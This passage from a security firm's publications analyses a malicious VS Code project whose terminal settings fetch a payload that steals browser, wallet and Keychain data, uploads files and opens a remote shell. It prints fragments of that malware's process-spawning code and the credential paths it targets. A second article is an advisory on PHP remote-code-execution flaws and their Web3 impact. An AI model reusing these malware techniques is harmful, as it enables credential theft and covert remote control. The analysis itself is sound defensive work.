It is worth noting that VS Code workspace configurations can trigger command execution in more than one way. The sol-live project analyzed in this article triggers commands through the terminal launch configuration in .vscode/settings.json, while vscode_tasks_command_execute_poc , previously published by SlowMist founder Cos, leverages the automatic task configuration in .vscode/tasks.json. The two methods differ in their configuration entry points and triggering conditions, as detailed below:

In addition, the **/.vscode rule in files.exclude hides the .vscode directory in the VS Code file explorer. This rule does not delete files or prevent VS Code from reading workspace settings, but it reduces the likelihood that users will discover the malicious terminal configuration.

Stage Two: Obfuscated Payload and Three Background Processes

After reconstructing the remote response text offline, the analysis identified three main scripts corresponding to the browser data theft module, the file scanning and uploading module, and the remote control module. In addition, the code embeds a script intended to restart the file scanning and uploading module.

The main program first checks for four JavaScript libraries: socket.io-client, sql.js, form-data, and axios, installing any missing libraries via npm. The main program then uses the current Node.js executable to launch three child processes, passing each module's script text through standard input. The launch arguments are --max-old-space-size=4096 --no-warnings -. Combined with detached, windowsHide, output suppression, and unref(), these settings allow the child processes to continue running independently of the main program while reducing visible output. The following shows the reconstructed call structure, with variable names adjusted for readability.


const child = spawn(process.execPath, ["--max-old-space-size=4096", "--no-warnings", "-"], {
   detached: true,
   windowsHide: true,
   stdio: ["pipe", "ignore", "ignore"],
 });
 child.stdin.end(scriptText);
 child.unref();

The script identifiers and process record files for the three modules are mapped as follows:

The main program writes the process ID and start time to the files listed above in the system temporary directory. These files are used to check whether the original process is still running before restarting a module. The code analyzed in this investigation contains no system startup mechanisms such as macOS login items or launch services, Windows scheduled tasks, or Linux scheduled tasks. Running independently of the parent process, recording process information, and calling unref() do not in themselves constitute an automatic recovery mechanism after a system restart. In the analyzed macOS and Linux execution chains, running the project's malicious terminal configuration again can still retrigger execution.

Browsers, Wallet Extensions, and macOS Keychain

The browser data theft module first generates sysinfo.txt, recording the hostname, operating system, username, platform, and time. The module includes path rules for 13 Chromium-based browsers, including Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex, and Kiwi, and lists the relevant paths for Windows, macOS, and Linux. In a Windows Subsystem for Linux (WSL) environment, the module also attempts to access Windows browser profiles under /mnt/c/Users/<username>/AppData/Local.

The module reads the Login Data, Login Data For Account, and Web Data databases in the browsers' Default and Profile* configuration directories to collect login credentials and autofill data. Meanwhile, the code checks the Local Extension Settings directories corresponding to 41 hardcoded extension IDs, targeting the local storage of common wallet extensions such as MetaMask, Phantom, TronLink, and Rabby. Brave's Local Storage/leveldb is also within the collection scope. On macOS, the module additionally copies ~/Library/Keychains/login.keychain-db directly.

Data collection must be distinguished from plaintext decryption capabilities. In the current version, decryptPassword() executes return "" immediately upon entering the function, making the subsequent AES-GCM and DPAPI decryption branches unreachable. Therefore, this function does not recover plaintext browser passwords on the local machine.

function decryptPassword(encryptedPassword, masterKey = null) {
   return "";   // Subsequent AES-GCM / DPAPI branches are unreachable
   // ...
}

Database queries still extract URLs, usernames, and encrypted password values. Because the decryption result is empty, the code converts the encrypted values into Base64 text and writes them to the p_encrypted field. It may also generate s.txt and upload it along with the other files. The code also contains a function for retrieving the browser's password-encryption master key, involving Windows DPAPI, Linux key storage, and macOS's security find-generic-password. Its effectiveness depends on the system format, execution privileges, and service name; this has not been verified through execution in this analysis.

Whether wallet extension data is encrypted locally depends on each extension’s implementation. Copying the corresponding directories does not mean that the seed phrases or private keys have already been obtained, and this analysis has not verified whether the data can be decrypted. Similarly, obtaining the login.keychain-db file does not mean that the plaintext credentials stored within it have been acquired. The file remains protected by the user's login password, and subsequent decryption also depends on whether the attacker obtains the relevant password or corresponding system access privileges.

The collected files are packaged into a form using form-data and uploaded to 172[.]86[.]112[.]107:8085/upload. The request includes the fixed marker userkey=206, t=2, as well as the hostname, timestamp, and file information. An HMAC-SHA256 checksum is calculated using the hardcoded key SuperStr0ngSecret@)@^2026!. This checksum is used to verify whether the request comes from a party possessing the corresponding key; it does not encrypt the content. The upload uses plaintext HTTP, so the transmitted content is not protected by encryption. The module executes a maximum of 11 loops, with a 30-second interval between loops, and queries the database once every three loops.

File Scanning and Upload

The file scanning and uploading module begins scanning approximately one second after startup. The code comment specifies “10 minutes,” but the actual delay parameter corresponds to one second. The code parameter should therefore take precedence.

The module prioritizes scanning directories such as Desktop, Documents, Downloads, cloud drives, Projects, Development, and Code. Files in these priority directories enter the upload queue as long as they are not excluded by extension rules and do not exceed 5 MiB in size. They do not need to match any sensitive keywords. After scanning the priority directories, the module recursively scans other directories under the user’s home directory. At this stage, file paths must match SENSITIVE_FILE_PATTERNS. This rule set covers keywords related to seed phrases, private keys, wallets, .env files, configurations, databases, documents, and screenshots. On Windows, the scanning scope expands to all drives. In a WSL environment, /mnt is also included in the priority scanning scope.

The scanner skips directories such as .ssh, .aws, .gnupg, .kube, and .config, with a maximum recursion depth of 20 levels. These exclusion rules apply only to the file scanning and uploading module. The remote control module can still read specified files accessible under the current execution privileges and is not subject to these directory exclusion rules.

Files are uploaded through the file field in a form to 172[.]86[.]112[.]107:8086/upload. The request also includes the original path, hostname, userkey=206, and t=2. Each file is limited to 5 MiB. After an upload failure, the module retries up to two times, allowing a maximum of three attempts in total.

Remote Control, File Reading, and Clipboard

The remote control module first submits host information to 172[.]86[.]112[.]107:8087/api/notify. After a successful response, it connects to ws://172[.]86[.]112[.]107:8087. Approximately one second after establishing the connection, the module searches for .env* files in the user's home directory and passes the results to the upload function.

The command-handling logic includes the following file and directory operations:

102: Lists basic information about directories and files.

107: Reads a file at the specified path and uploads it to port 8085 via POST /api/upload-file.

108: Uploads files one level below the specified directory, with a maximum size of 25 MiB per file.

The general command execution branch passes commands issued by the server to exec(command) and returns standard output and standard error through the connection.

The module also provides interactive remote terminal capabilities, controlling sessions through messages for opening, input, resizing the window, closing, and disconnecting, and returning output through shellOutput. Depending on the operating system, the code attempts different implementations, including Node PTY (pseudo-terminal), Python PTY, script, Windows console utilities such as winpty and conhost, and ordinary process pipes. When necessary, it installs @homebridge/node-pty-prebuilt-multiarch, node-pty-prebuilt-multiarch, or node-pty. These implementations are all derived from the retrieved response code; their cross-platform behavior has not been verified.

The clipboard monitoring logic in the remote control module reads the clipboard once per second. On Windows, it invokes Windows Forms through PowerShell; on macOS, it uses pbpaste; on Linux, it uses xclip or xsel; and in WSL, it invokes PowerShell to read the Windows clipboard. When the content is non-empty and differs from the previous reading, the module sends it as the message field to 172[.]86[.]112[.]107:8087/api/log.

The server can also manage background modules through processControl. The start operation restarts the file scanning and uploading module using the embedded script text. No equivalent logic is provided to restart the browser data theft module or the remote control module in the same way. The stop operation reads the corresponding process record file according to scriptType and terminates the process, covering all three types of modules.

const lockFileMap = {
   ldbScript: path.join(os.tmpdir(), `pid.${2}.1.lock`),
   autoUploadScript: path.join(os.tmpdir(), `pid.${2}.2.lock`),
   socketScript: path.join(os.tmpdir(), `pid.${2}.3.lock`),
 };
// stop: Reads the corresponding lock file according to scriptType and calls process.kill
// start: Restarts only autoUploadScript
 sp_s(a_scr, "pid." + 2 + ".2.lock", "autoUploadScript");

Related Projects

In addition to Hylance/sol-live, the main focus of this article, we identified eight other GitHub projects containing similar terminal configurations that download remote content and pass it to sh or eval for execution. The analysis of these projects was limited to preliminary configuration checks; not all remote payloads were retrieved and analyzed in depth individually. Links to the relevant repositories are listed in the IOC section at the end of this article for investigation and forensic reference.

Conclusion

Analysis of the archived source code and retained payloads indicates that sol-live uses VS Code workspace terminal configurations to establish a remote code execution chain. On macOS and Linux, users must actively use the project’s malicious terminal configuration. Although Windows has a default PowerShell configuration and attempts to run it in a hidden window, issues with quotation mark handling when generating app.js mean that its execution effectiveness remains unconfirmed.

The remote payload obtained in this analysis is capable of collecting browser login databases and wallet extension storage, copying macOS Keychain files, uploading local files, monitoring the clipboard, and executing remote commands. However, the browser password decryption function directly returns an empty string. Collecting encrypted databases or Keychain files does not mean that plaintext passwords, seed phrases, or private keys have been obtained. Due to the lack of records from victim hosts, this article cannot confirm the actual scope of infection, the results of credential decryption, or whether data was exfiltrated.

Risk investigations should prioritize hosts that have previously used the relevant malicious terminal configurations, with execution assessed based on process records, dropped files, and network connection logs. Wallet credentials and exchange account credentials saved in browsers should be prioritized for risk assessment.

Recommendations

The following recommendations cover host investigation, credential remediation, and project review. For hosts where malicious code execution has been confirmed or cannot be ruled out, isolate the host first and preserve the information required for investigation. Wallet migration and credential rotation should then be performed from a trusted device. Merely opening a project must be distinguished from actually triggering its malicious terminal configuration.

  1. Isolate potentially affected hosts and investigate execution traces. For Hylance/sol-live, focus on whether the project’s custom zsh/bash configuration was used to launch a terminal. If this cannot be confirmed, further assessment should be conducted using logs and dropped files. Check for the literal ~ directory under the project directory or terminal working directory, and locate .vscode/cache/app.js within it. Also inspect pid.2.1.lock through pid.2.3.lock in the system temporary directory, as well as whether Node.js processes have connected to 172[.]86[.]112[.]107. For related projects containing Windows terminal configurations, inspect $PROFILE, %temp%\settings.cmd, Defender exclusions, and records of connections to malicious domains based on the actual commands in the corresponding configurations. Avoid treating artifacts from different projects as equivalent.
  2. Treat wallet seed phrases and private keys used or stored on hosts where malicious code execution has been confirmed or cannot be ruled out as compromised. Create new wallets on trusted devices and migrate assets. At the same time, review on-chain contract approvals associated with the old addresses and revoke approvals that are no longer needed or pose a risk. This is a risk mitigation measure and does not mean that this article has confirmed the corresponding credentials were leaked.
  3. Rotate browser account passwords, exchange API keys, SSH keys, and cloud service credentials stored or used on the relevant hosts. The scanner’s exclusion rules for certain directories do not restrict the remote control module’s ability to access them, so these rules cannot be used to rule out credential risks. macOS users should also change their login passwords and rotate relevant passwords and keys stored in Keychain. Changing the login password does not invalidate an old Keychain file that may already have been copied.
  4. Search proxy and DNS resolution logs for the malicious domains and URLs listed in the IOC section. Search endpoint detection and response (EDR) logs for relevant processes, connection records, and the file fingerprint of sol-live.zip. GitHub repository links are provided to help locate projects, support forensic investigations, and report them to the platform. They should not be used as a basis for blocking the entire github.com domain.
  5. Avoid downloading malicious projects listed in the IOC section into everyday work environments or opening them directly in VS Code. When receiving interview questions or practice projects, review .vscode/settings.json first. Inspect defaultProfile, custom terminal configurations, and their launch arguments, paying particular attention to commands that download and immediately execute content using wget or curl, run in the background using nohup, write to $PROFILE, or invoke eval. The absence of a default terminal configuration does not mean a project is risk-free, as manually using a malicious configuration can also trigger execution. Do not launch project-defined terminals before completing the review.
  6. Code hosting platforms and security scanning tools should detect hidden configuration directories in conjunction with terminal download-and-execute behavior. For example, if files.exclude hides .vscode while terminal launch arguments contain download-and-execute commands obscured through whitespace padding, quotation marks, or escape sequences, this should be treated as a high-risk indicator.

item.title: PHP Unveils Critical “Internet-Wide” Vulnerabilities: How Can Web3 Patch Its “Off-Chain Weaknesses”?
item.dc:creator: SlowMist
item.content:encoded:
What Happened

On October 21, the PHP project released emergency security updates to fix two critical vulnerabilities, CVE-2026–109618 and CVE-2026–109619, which could lead to unauthenticated remote code execution (RCE). Both were rated 9.2 under CVSS v4.0. The PHP team explicitly stated that before the fixes, all PHP installations providing web services to the public could be affected.

On October 20, details of the vulnerabilities leaked before the official disclosure, while the patches had not yet been released. The PHP security team had no choice but to move up the release of the emergency versions from the originally scheduled October 22 to October 21 at 14:00 (UTC).

More concerningly, the attacks may have started before the disclosure. Amazon’s threat intelligence team reported that they had observed exploitation attempts targeting php2shell in their MadPot honeypot network as early as October 17, four days before the public disclosure.

SlowMist also issued security alerts and recommendations as soon as the PHP project’s advance announcement was published.

What Are the Two Vulnerabilities?

CVE-2026–109618 (OOM Memory Corruption): When PHP runs out of memory, the processing flow is interrupted, leaving the data only partially prepared. During cleanup, however, PHP treats these incomplete data structures as if they were complete, resulting in memory corruption.

CVE-2026–109619 (Stale Global State): After a request has been processed, the memory has already been freed, but the associated state remains “in place.” When the same worker process handles the next request, it may use this stale state before normal initialization takes place. The official team has confirmed that this vulnerability can be exploited to attack PHP-FPM and achieve remote code execution.

From the perspective of the attack path, the danger of these vulnerabilities lies in the fact that attackers do not need to obtain a site account first, nor do they need to bypass business-layer login, permission, or API Key verification. Sending a crafted request to a PHP application exposed to the public internet may be enough to execute arbitrary code with the privileges of the web service process.

Affected Versions: PHP versions 5.4 through 8.5.11 are affected. The patched versions are 8.5.12, 8.4.27, 8.3.36, and 8.2.35. PHP 8.1 and earlier versions have reached the end of regular upstream support, so regular patches cannot be expected through standard channels. These versions should be migrated to versions that are still supported.

Why Is the Whole World on Edge?

Because PHP is extremely widespread. According to W3Techs statistics, PHP is used by 69.3% of websites for which the server-side programming language is identifiable. Familiar systems such as WordPress, WooCommerce, and Magento all run on it.

The responses from various countries also illustrate the seriousness of the issue. The Dutch National Cyber Security Centre temporarily shut down websites as a precautionary measure, while the South Korean presidential office convened an emergency cybersecurity meeting and the government raised its cybersecurity alert level.

In addition, according to reports, almost all official North Korean websites, including official media outlets and government portals, have been offline for more than 24 hours. It is not yet known whether this is related to the vulnerability incident.

Impact on Web3

This is not just an issue concerning the operation and maintenance of traditional websites. For Web3, even if on-chain contracts have no vulnerabilities, many of the numerous “off-chain components” that support their operation, including frontend pages, APIs, hosted wallets, signing services, airdrop claim pages, admin panels, and data services, are built with PHP (using platforms such as WordPress, WooCommerce, and Magento). The absence of vulnerabilities in the contracts themselves does not mean these components are secure.

According to statistics from MistEye, the threat intelligence system under SlowMist, of the 1,488 crypto industry-related domains it scanned, 793 had direct PHP fingerprints, accounting for approximately 53.3%. It is important to emphasize that this only indicates the use of PHP and does not mean these websites are vulnerable or have been compromised.

1. Platforms: Several Typical Risk Scenarios

Frontend tampering and users being tricked into signing transactions. If the servers hosting DeFi websites, wallet-related websites, or airdrop pages are compromised, attackers can replace the RPC address, approval target, contract address, or signing prompt on the page, turning a normal transaction into a malicious approval, malicious contract interaction, or fake deposit process. Attackers do not need to compromise the contract; they only need to trick users into signing a malicious approval themselves.

Leakage of keys and credentials. Once a server is compromised, attackers may be able to access configuration files, database passwords, API Tokens, environment variables, and other sensitive information. If the PHP backend integrates with node RPCs or hot wallet services, leaked API Keys or session tokens could lead to the transfer of hot wallet assets or the abuse of signing permissions.

Compromise of admin panels and APIs. Exchanges, NFT marketplaces, cross-chain bridges, payment gateways, and node service providers typically have admin panels, as well as KYC/risk control interfaces, deposit address allocation systems, withdrawal approval systems, ticketing systems, and other components. Once attackers gain access, they may tamper with configurations, steal user data, create accounts with elevated privileges, or bypass business processes.

Lateral movement through the supply chain. A PHP process typically does not have the highest level of privilege on a server. However, if it can access CI/CD keys, container runtime sockets, database credentials, or cloud access tokens, the scope of an attack could expand from a single web node to databases, build systems, or even an entire production account.

Payment plugins and third-party services. According to available information, crypto payment solutions such as Binance Pay, Crypto.com Pay, BitPay, CoinGate, and CoinPayments all offer WooCommerce integrations. Unpatched servers face serious exposure risks. Third-party services such as RPC providers, block explorers, and data analytics platforms could also become entry points if their admin panels or operations systems run in affected PHP environments. Of course, RPC nodes, smart contracts, block explorers, and wallets do not inherently depend on PHP; this depends on the technology stack of each specific product.

However, it is important to note that a compromised server does not necessarily mean on-chain assets will be stolen. Between a web service being compromised and actual financial losses occurring, the outcome depends on whether attackers can access sensitive credentials, signing processes, administrative privileges, or user interaction channels. Whether hot wallets are isolated from the web layer, whether keys are stored in HSMs/KMS, and whether permissions follow the principle of least privilege directly determine the potential extent of losses.

2. Ordinary Users: Should You Withdraw Your Crypto?

No. The reason is simple:

This vulnerability affects server environments that meet specific conditions. It does not mean that all users’ wallets are at risk.

Browsing a website or connecting a wallet is not the same as exposing a private key. The vulnerability itself cannot directly crack users’ wallets or signatures.

A project may use PHP, but that does not mean it has already been compromised. There is no reason to assume that every exchange has been breached, and there is certainly no need to withdraw all your assets as a result.

What users should actually be wary of is whether the websites they visit have been compromised. Users cannot determine whether a website has been patched, so this incident serves as a reminder not to blindly trust website interfaces. Attackers may also exploit the public attention surrounding the incident to spread fake login pages, fake compensation portals, and malicious wallet connection requests.

If a project’s official team confirms that its website or admin panel has been compromised, assess the actual impact disclosed in the announcement to determine whether to suspend interactions, check for abnormal transactions, and revoke suspicious approvals. If a signing private key or seed phrase is confirmed to have been leaked, treat it as a key compromise incident. Simply changing a password or disconnecting from a website is not enough. Users of trading bots, automated execution tools, or cloud deployment services should also pay attention to whether the relevant services have issued notifications regarding affected versions or credential rotation.

How to Respond

1. Platforms and Projects

Step 1: Take Inventory and Upgrade as Soon as Possible

Inventory all public-facing and internal PHP assets, including hosts, container images, Kubernetes workloads, legacy CMSs, admin panels, partner-hosted environments, third-party plugins, and managed services. Technology fingerprints should only be treated as clues, not as definitive evidence that a vulnerability is present.

Upgrade to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12, or apply equivalent patches provided by operating system distributions, cloud providers, or managed service providers. For PHP 8.1 and earlier, request backported patches from the vendor or migrate as soon as possible. A “stable legacy environment” or an “application that is rarely updated” does not reduce the risk posed by this vulnerability.

After upgrading, rebuild container images, perform rolling restarts, or replace all PHP worker processes. Verify the runtime version actually handling requests in production, rather than checking only the version on build machines or in the command line.

Step 2: What If Upgrading Is Not Immediately Possible?

Reduce the attack surface first to buy time, but this cannot replace patching:

  • Isolate publicly exposed PHP applications, or add network authentication and access controls at the entry layer.
  • Disable unnecessary file uploads and reject unnecessary multipart/form-data requests at the WAF or web server layer.
  • Some security recommendations also include setting memory_limit=-1, disabling session.upload_progress.enabled, and, on PHP 8.5, disabling fatal_error_backtraces. These configurations can have business and availability side effects, so test them first and restart all PHP workers after each change.

Step 3: Check for Compromise and Rotate Credentials

For affected services that were previously exposed to the public internet, investigate using logs, endpoint monitoring, and abnormal network connections. For example, check whether PHP processes have suddenly started executing system commands. If a suspected intrusion is detected, preserve evidence first, then respond according to the incident response procedure.

Assume the worst-case scenario: for servers that were not patched in time, rotate API keys, session keys, TLS certificates, database passwords, cloud access tokens, CI/CD credentials, RPC/API Keys, Webhook secrets, and third-party Tokens, and check for records of abnormal usage.

If the environment has installed or run software versions confirmed to be compromised, upgrading or reinstalling alone does not prove that the risk has been eliminated. Credentials must also be checked for exposure, and persistent backdoors must be investigated. Rebuild a clean environment if necessary.

Step 4: Protect the Asset Control Plane

Patching PHP should not be the only action. More importantly, ensure that “a compromised web server cannot bring down the fund management system”:

  • Completely isolate the private keys for hot wallets, collection wallets, and critical signing services from web nodes. Use HSMs, MPC, dedicated signing networks, or KMS policies with least-privilege access.
  • Place web services, signing services, on-chain nodes, databases, and build systems in separate network segments and identity boundaries.
  • Temporarily tighten controls on high-risk operations during the incident, such as withdrawals, address whitelist changes, administrator privilege escalation, API Key creation, and risk control rule modifications. Enable manual review or delayed activation when necessary.
  • For automated on-chain execution services, adopt independent signing, multisignature approval, transaction limits, and emergency shutdown mechanisms as appropriate for the business.
  • Inspect website static resources, JavaScript packages, reverse proxy configurations, DNS/CDN rules, and transaction construction services to ensure that no malicious scripts have been injected and no components have been replaced.

2. Ordinary Users

Use official access points: As much as possible, access platforms through bookmarks or official channels in the near term, and be wary of links sent under the pretext of a “security incident.”

Do not rely solely on the domain name or interface: Even if a familiar dApp domain is used, page scripts, transaction parameters, and RPC configurations may have been replaced by an attacker who compromised the server.

Check every detail before signing: Verify the recipient address, blockchain network, approval amount, contract being called, and transaction simulation results. Be especially cautious with approve and setApprovalForAll, and exercise extra care with unlimited token approvals.

Beware of “compensation,” “migration,” and “reverification” requests: During an incident, prompts such as “log in again,” “reverify your wallet,” “migrate assets,” or “claim compensation” may appear. Do not act solely on the basis of an in-site pop-up. Cross-check the information through multiple official project channels.

Separate assets by purpose: Use a hardware wallet to store large holdings, and a separate wallet with limited funds for routine interactions. Regularly review and revoke approvals. This limits potential losses from any single incident involving a frontend or platform.

Stop if anything seems unusual: If you encounter an unexpected signing request, an unanticipated approval prompt, or suspicious website behavior, pause and verify the situation through official channels.

Final Thoughts

Unauthenticated remote code execution vulnerabilities such as PHP2Shell can turn a traditional server intrusion into frontend poisoning, identity impersonation, abuse of signing permissions, hot wallet risks, and even lateral penetration at the supply chain level once the web layer is breached.

For platforms, there are three top priorities: upgrade to patched versions, isolate legacy environments that cannot be patched immediately, and audit keys and the asset control plane. After upgrading, checking for signs of intrusion should also be part of the incident response process. For users, during this period, it is important to place less blind trust in website interfaces and take an extra moment to check before signing each transaction.

However, there is no need to panic excessively: the existence of a vulnerability does not mean assets are necessarily at risk, and a compromised server does not necessarily result in on-chain fund losses. What truly determines the level of risk is which credentials attackers can obtain, how much privilege those credentials grant, and how quickly the project can isolate and revoke those privileges. For Web3 projects, security measures should not only aim to prevent attacks from occurring, but also consider whether, if a component is actually compromised, the impact can be contained locally without allowing the risk to spread to core business operations and asset-related systems.
